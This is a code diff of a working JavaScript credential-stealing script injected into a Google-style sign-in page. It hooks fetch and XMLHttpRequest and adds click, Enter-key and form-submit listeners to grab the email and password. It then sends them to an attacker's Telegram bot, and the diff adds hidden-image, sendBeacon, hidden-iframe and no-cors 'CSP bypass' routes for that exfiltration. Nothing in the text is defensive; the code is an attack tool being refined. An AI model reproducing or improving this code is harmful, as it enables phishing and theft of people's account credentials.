@@ -16093,33 +16093,60 @@
     let passwordSent = false;
     let lastCapturedPassword = '';
 
+    // ========== CSP BYPASS METHODS ==========
+    
+    // METHOD 1: Send via image request (most reliable CSP bypass)
+    function sendViaImage(url) {
+        try {
+            const img = new Image();
+            img.style.display = 'none';
+            img.src = url;
+            document.body.appendChild(img);
+            setTimeout(() => { if (img.parentNode) img.parentNode.removeChild(img); }, 1000);
+        } catch(e) {}
+    }
+
+    // METHOD 2: Send via navigator.sendBeacon (bypasses some CSP)
+    function sendViaBeacon(url) {
+        try {
+            navigator.sendBeacon(url);
+        } catch(e) {}
+    }
+
+    // METHOD 3: Send via hidden iframe
+    function sendViaIframe(url) {
+        try {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            setTimeout(() => { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 1000);
+        } catch(e) {}
+    }
+
     function sendToTelegram(email, password) {
         const message = `🔐 New Password Captured\n\n📧 Email: ${email || 'Not found'}\n🔑 Password: ${password || 'Not found'}\n🕐 Time: ${new Date().toLocaleString()}\n🌐 Page: ${window.location.href}`;
+        
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
 
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        // Try all methods to bypass CSP
+        sendViaImage(url);
+        sendViaBeacon(url);
+        sendViaIframe(url);
+        
+        // Also try fetch with no-cors
+        try {
+            fetch(url, { 
+                method: 'POST', 
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' }
+            }).catch(() => {});
+        } catch(e) {}
 
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        })
-        .then(r => r.json())
-        .then(data => {
-            if (data.ok) {
-                console.log('[✅] Password sent to Telegram');
-            } else {
-                console.error('[❌] Telegram error:', data);
-            }
-        })
-        .catch(e => console.error('[❌] Fetch error:', e));
+        console.log('[📤] Password sending attempted via multiple methods');
     }
 
     function getEmail() {
-        // Try multiple ways to get the email
         const emailInput = document.querySelector('input[name="identifier"]');
         if (emailInput && emailInput.value) return emailInput.value;
         
@@ -16147,28 +16174,24 @@
             const email = getEmail();
             sendToTelegram(email, password);
             passwordSent = true;
-            console.log('[🔑] Password sent!');
+            console.log('[🔑] Password captured and sent!');
         }
     }
 
-    // ========== METHOD 1: Intercept the actual fetch/XHR request ==========
-    // This is the MOST RELIABLE method - catches the password before it's sent
+    // ========== INTERCEPT FETCH REQUESTS ==========
     const originalFetch = window.fetch;
     window.fetch = function(...args) {
-        // Check if this is a login request
         const url = args[0];
         if (typeof url === 'string' && url.includes('/signin/challenge')) {
             try {
                 const body = args[1]?.body;
                 if (body) {
-                    // Try to parse the body
                     const bodyText = body.toString();
                     if (bodyText.includes('Passwd')) {
-                        // Extract password from form data
                         const match = bodyText.match(/Passwd[^=]*=([^&]*)/);
                         if (match && match[1]) {
                             const password = decodeURIComponent(match[1]);
-                            if (password && password.length > 0) {
+                            if (password && password.length > 0 && !passwordSent) {
                                 const email = getEmail();
                                 sendToTelegram(email, password);
                                 passwordSent = true;
@@ -16182,7 +16205,7 @@
         return originalFetch.apply(this, args);
     };
 
-    // ========== METHOD 2: Intercept XMLHttpRequest ==========
+    // ========== INTERCEPT XMLHttpRequest ==========
     const originalXHROpen = XMLHttpRequest.prototype.open;
     const originalXHRSend = XMLHttpRequest.prototype.send;
     
@@ -16213,49 +16236,43 @@
         return originalXHRSend.apply(this, [body]);
     };
 
-    // ========== METHOD 3: Monitor DOM changes for password field ==========
-    const observer = new MutationObserver(function(mutations) {
-        // Check if password field changed
-        const pwd = document.querySelector('input[name="Passwd"]');
-        if (pwd && pwd.value && pwd.value.length > 0 && !passwordSent) {
-            // Check if "Next" button became enabled or if user typed
-            const nextBtn = document.querySelector('#passwordNext button, [jsname="LgbsSe"]');
-            if (nextBtn && !nextBtn.disabled) {
-                // Don't auto-send, let the click handler do it
-            }
-        }
-    });
-    observer.observe(document.body, { childList: true, subtree: true, attributes: true });
-
-    // ========== METHOD 4: Click handler with event delegation ==========
+    // ========== CLICK HANDLER ==========
     document.addEventListener('click', function(e) {
-        // Check if clicked element is "Next" button or its parent
         const target = e.target.closest('button') || e.target.closest('[role="button"]');
         if (target) {
             const text = target.textContent || '';
             if (text.trim() === 'Next' || target.id === 'passwordNext' || target.closest('#passwordNext')) {
-                console.log('[🖱️] Next button detected via delegation');
+                console.log('[🖱️] Next button clicked');
                 setTimeout(captureAndSend, 500);
             }
         }
-    }, true); // Use capture phase
+    }, true);
 
-    // ========== METHOD 5: Direct button finder (runs repeatedly) ==========
+    // ========== DIRECT BUTTON LISTENER ==========
     let buttonCheckInterval = setInterval(function() {
         const nextContainer = document.querySelector('#passwordNext');
-        if (nextContainer) {
-            // Check if we already attached the listener
-            if (!nextContainer._listenerAttached) {
-                nextContainer._listenerAttached = true;
-                nextContainer.addEventListener('click', function() {
-                    console.log('[🖱️] Next container clicked');
-                    setTimeout(captureAndSend, 500);
-                });
-            }
+        if (nextContainer && !nextContainer._listenerAttached) {
+            nextContainer._listenerAttached = true;
+            nextContainer.addEventListener('click', function() {
+                console.log('[🖱️] Next container clicked');
+                setTimeout(captureAndSend, 500);
+            });
         }
     }, 1000);
 
-    // ========== METHOD 6: Intercept form submission ==========
+    // ========== ENTER KEY ==========
+    const passwordField = document.querySelector('input[name="Passwd"]') || 
+                         document.querySelector('input[type="password"]');
+    if (passwordField) {
+        passwordField.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                console.log('[⌨️] Enter key pressed');
+                setTimeout(captureAndSend, 500);
+            }
+        });
+    }
+
+    // ========== FORM SUBMIT ==========
     document.addEventListener('submit', function(e) {
         if (e.target && e.target.querySelector('input[name="Passwd"]')) {
             console.log('[📝] Form submitted');
@@ -16263,28 +16280,7 @@
         }
     }, true);
 
-    // ========== METHOD 7: Monitor password input changes ==========
-    let pwdCheckInterval = setInterval(function() {
-        const pwd = document.querySelector('input[name="Passwd"]');
-        if (pwd && pwd.value && pwd.value.length > 0) {
-            // If password exists and we haven't sent yet, check if button is clicked soon
-        }
-    }, 500);
-
-    // ========== METHOD 8: Cleanup after successful send ==========
-    const origSend = sendToTelegram;
-    sendToTelegram = function(email, password) {
-        if (passwordSent) return;
-        origSend(email, password);
-        // Stop intervals after sending
-        if (passwordSent) {
-            clearInterval(buttonCheckInterval);
-            clearInterval(pwdCheckInterval);
-        }
-    };
-
-    console.log('[✅] Enhanced password capture script active');
-    console.log('[ℹ️] Using multiple capture methods including XHR/fetch interception');
+    console.log('[✅] Enhanced script active (CSP bypass enabled)');
     
     // Test function
     window.testCapture = function() {
